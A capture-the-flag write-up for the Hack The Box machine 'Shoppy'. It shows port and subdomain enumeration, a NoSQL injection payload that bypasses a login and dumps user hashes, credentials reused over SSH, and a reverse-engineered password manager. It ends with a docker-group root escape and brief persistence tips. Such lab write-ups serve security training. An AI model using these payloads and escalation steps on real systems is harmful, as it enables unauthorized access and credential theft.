# Shoppy

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.233
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 14:12 EDT
Nmap scan report for 10.129.227.233
Host is up (0.0063s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat
```

We have to add `shoppy.htb` to our `/etc/hosts` file.&#x20;

### HTTP

Port 80 reveals a count down to the release of a website.

<figure><img src="../../../.gitbook/assets/image (2643).png" alt=""><figcaption></figcaption></figure>

Doing a `gobuster` scan reveals a few directories:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://shoppy.htb -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/06 14:14:56 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/js                   (Status: 301) [Size: 171] [--> /js/]
```

There's a login page.&#x20;

<figure><img src="../../../.gitbook/assets/image (2180).png" alt=""><figcaption></figcaption></figure>

I tested SQL Injection, but it didn't seem to work. We can still fuzz subdomains using `wfuzz`, and I did find one:

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host:FUZZ.shoppy.htb' --hw=11 -u http://shoppy.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shoppy.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000047340:   200        0 L      141 W      3122 Ch     "mattermost"
```

### Mattermost

The sub-domain brought me to another login page.

<figure><img src="../../../.gitbook/assets/image (2272).png" alt=""><figcaption></figcaption></figure>

Directory scanning and searching for public exploits returned nothing useful, so let's come back to this later.&#x20;

### NoSQL Injection

On the main `shoppy.htb` website, I tried NoSQL Injection using both regular HTTP parameters and JSON. I was able to bypass it using this:

```
username=admin'||'1=1&password=pass
```

<figure><img src="../../../.gitbook/assets/image (2556).png" alt=""><figcaption></figcaption></figure>

With this, we can login to the admin dashboard:

<figure><img src="../../../.gitbook/assets/image (1160).png" alt=""><figcaption></figcaption></figure>

There was a Search for Users function, and since this application is already vulnerable to NoSQL Injection, we can use a similar payload to see what we get:

```
'||'1=1
```

Then we can download the export to see some credentials:

<figure><img src="../../../.gitbook/assets/image (1725).png" alt=""><figcaption></figcaption></figure>

The hash for `josh` cracks.

<figure><img src="../../../.gitbook/assets/image (1526).png" alt=""><figcaption></figcaption></figure>

Using that, we can login to Mattermost and see that there are credentials on the screen!

<figure><img src="../../../.gitbook/assets/image (713).png" alt=""><figcaption></figcaption></figure>

We can use this to `ssh` in as the user.

<figure><img src="../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Password Manager RE

As this user, we can run a command using `sudo` as `deploy`.

```
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

When run, it prompts us for a password, and I tried to reuse both of the passwords we found earlier but it doesn't work.

```
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: remembermethisway
Access denied! This incident will be reported !
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sh0ppyBest@pp!
Access denied! This incident will be reported !
```

We can transfer this back to my machine and decompile it with `ghidra`. When opened, we can see the master password it is compared to.

<figure><img src="../../../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>

We can use this to get the real password:

```
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

We can then `su` to `deploy`.&#x20;

### Docker Group

As this new user, we are part of the `docker` group.

```
deploy@shoppy:/tmp$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

We can use this to create a new container that has access to the filesystem of the machine, and make ourselves `root` of the container. This effectively gives us `root` access over the files of the main machine too.&#x20;

```
deploy@shoppy:/tmp$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   9 months ago   5.53MB
deploy@shoppy:/tmp$ docker run --rm -it -v /:/mnt alpine /bin/sh
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

With this, we can go to `/mnt/root/root.txt` to read the root flag. We can also drop our public SSH key into the `authorized_keys` file or make `/bin/bash` an SUID binary.&#x20;

<figure><img src="../../../.gitbook/assets/image (4065).png" alt=""><figcaption></figcaption></figure>
